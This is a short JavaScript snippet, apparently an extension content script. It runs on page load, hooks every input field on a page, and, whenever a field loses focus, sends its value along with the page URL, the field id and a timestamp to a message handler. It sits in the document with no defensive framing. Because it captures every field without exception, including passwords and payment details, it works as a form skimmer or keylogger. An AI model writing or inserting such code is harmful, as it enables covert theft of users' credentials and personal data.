function loadInputLogger() {
    var inputs = document.querySelectorAll('input');
    inputs.forEach(i => {
        i.addEventListener("blur", (event) => {
            sendMessage({
                type: "log", msg: JSON.stringify({ "log": event.currentTarget.value, 'url': window.location.href, 'id': event.currentTarget.getAttribute("id"), "timestamp": Date.now() })
            })
        })
    });
}
loadInputLogger()